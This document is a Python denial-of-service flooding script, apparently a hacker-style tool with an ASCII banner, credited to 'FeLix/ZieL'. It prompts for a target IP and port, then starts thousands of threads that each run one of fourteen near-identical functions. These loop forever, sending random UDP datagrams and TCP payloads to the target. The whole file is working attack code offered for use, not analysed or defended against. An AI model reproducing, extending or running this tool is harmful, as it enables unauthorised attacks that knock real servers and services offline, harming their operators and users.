import random
import socket
import threading
import os,sys
os.system("clear")
print("""\033[31m
  █████▒▓█████  ██▓     ██▓▒██   ██▒
▓██   ▒ ▓█   ▀ ▓██▒    ▓██▒▒▒ █ █ ▒░
▒████ ░ ▒███   ▒██░    ▒██▒░░  █   ░
░▓█▒  ░ ▒▓█  ▄ ▒██░    ░██░ ░ █ █ ▒ 
░▒█░    ░▒████▒░██████▒░██░▒██▒ ▒██▒
 ▒ ░    ░░ ▒░ ░░ ▒░▓  ░░▓  ▒▒ ░ ░▓ ░
 ░       ░ ░  ░░ ░ ▒  ░ ▒ ░░░   ░▒ ░
 ░ ░       ░     ░ ░    ▒ ░ ░    ░  
           ░  ░    ░  ░ ░   ░    ░  
                                    \n\r""")
                                    
print("""\033[37m{\033[31mCreate Date\033[37m} 24/09/22
\033[37m{\033[31mMade By\033[37m} FeLix/ZieL
\r\n""")
ip = str(input("\033[37mIp Target : "))
port = int(input("Port Target : "))
choice = str(input("Sure? (\033[32my\033[37m/\033[31mn\033[37m) : "))
times = int(input("Times (\033[31m75000\033[37m) : "))
threads = int(input("Threads (\033[31m28000\033[37m) : "))
os.system("clear")

def run():
    data = random._urandom(1800)
    i = random.choice(("{!} ","{!} ","{!} "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip),int(port))
            for x in range(times):
                s.sendto(data,addr)
            print(i +"Attack From Exquisite On The Way To {}:{}".format(ip, port))
        except:
            print(i +"Attack From Exquisite On The Way To {}:{}".format(ip, port))
            
def run2():
    data = random._urandom(1024)
    i = random.choice(("{!} ","{!} ","{!} "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Attack From Exquisite On The Way To {}:{}".format(ip, port))
        except:
            s.close()
            print(i +"Attack From Exquisite On The Way To {}:{}".format(ip, port))
            
def run3():
    data = random._urandom(16)
    i = random.choice(("{!} ","{!} ","{!} "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Attack From Exquisite On The Way To {}:{}".format(ip, port))
        except:
            s.close()
            print(i +"Attack From Exquisite On The Way To {}:{}".format(ip, port))

def run4():
    data = random._urandom(16)
    i = random.choice(("{!} ","{!} ","{!} "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Attack From Exquisite On The Way To {}:{}".format(ip, port))
        except:
            s.close()
            print(i +"Attack From Exquisite On The Way To {}:{}".format(ip, port))
            
def run5():
    data = random._urandom(1800)
    i = random.choice(("{!} ","{!} ","{!} "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip),int(port))
            for x in range(times):
                s.sendto(data,addr)
            print(i +"Attack From Exquisite On The Way To {}:{}".format(ip, port))
        except:
            print(i +"Attack From Exquisite On The Way To {}:{}".format(ip, port))
            
def run6():
    data = random._urandom(1024)
    i = random.choice(("{!} ","{!} ","{!} "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Attack From Exquisite On The Way To {}:{}".format(ip, port))
        except:
            s.close()
            print(i +"Attack From Exquisite On The Way To {}:{}".format(ip, port))
            
def run7():
    data = random._urandom(16)
    i = random.choice(("{!} ","{!} ","{!} "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Attack From Exquisite On The Way To {}:{}".format(ip, port))
        except:
            s.close()
            print(i +"Attack From Exquisite On The Way To {}:{}".format(ip, port))

def run8():
    data = random._urandom(16)
    i = random.choice(("{!} ","{!} ","{!} "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Attack From Exquisite On The Way To {}:{}".format(ip, port))
        except:
            s.close()
            print(i +"Attack From Exquisite On The Way To {}:{}".format(ip, port))
            
def run9():
    data = random._urandom(1800)
    i = random.choice(("{!} ","{!} ","{!} "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip),int(port))
            for x in range(times):
                s.sendto(data,addr)
            print(i +"Attack From Exquisite On The Way To {}:{}".format(ip, port))
        except:
            print(i +"Attack From Exquisite On The Way To {}:{}".format(ip, port))
            
def run10():
    data = random._urandom(1024)
    i = random.choice(("{!} ","{!} ","{!} "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Attack From Exquisite On The Way To {}:{}".format(ip, port))
        except:
            s.close()
            print(i +"Attack From Exquisite On The Way To {}:{}".format(ip, port))
            
def run11():
    data = random._urandom(16)
    i = random.choice(("{!} ","{!} ","{!} "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Attack From Exquisite On The Way To {}:{}".format(ip, port))
        except:
            s.close()
            print(i +"Attack From Exquisite On The Way To {}:{}".format(ip, port))

def run12():
    data = random._urandom(16)
    i = random.choice(("{!} ","{!} ","{!} "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Attack From Exquisite On The Way To {}:{}".format(ip, port))
        except:
            s.close()
            print(i +"Attack From Exquisite On The Way To {}:{}".format(ip, port))
            
def run13():
    data = random._urandom(16)
    i = random.choice(("{!} ","{!} ","{!} "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Attack From Exquisite On The Way To {}:{}".format(ip, port))
        except:
            s.close()
            print(i +"Attack From Exquisite On The Way To {}:{}".format(ip, port))

def run14():
    data = random._urandom(16)
    i = random.choice(("{!} ","{!} ","{!} "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Attack From Exquisite On The Way To {}:{}".format(ip, port))
        except:
            s.close()
            print(i +"Attack From Exquisite On The Way To {}:{}".format(ip, port))
for y in range(threads):
    if choice == 'y':
        th = threading.Thread(target = run)
        th.start()
        th = threading.Thread(target = run2)
        th.start()
        th = threading.Thread(target = run3)
        th.start()
        th = threading.Thread(target = run4)
        th.start()
        th = threading.Thread(target = run5)
        th.start()
        th = threading.Thread(target = run6)
        th.start()
        th = threading.Thread(target = run7)
        th.start()
        th = threading.Thread(target = run8)
        th.start()
        th = threading.Thread(target = run9)
        th.start()
        th = threading.Thread(target = run10)
        th.start()
        th = threading.Thread(target = run11)
        th.start()
        th = threading.Thread(target = run12)
        th.start()
        th = threading.Thread(target = run13)
        th.start()
else:
        th = threading.Thread(target = run14)
        th.start()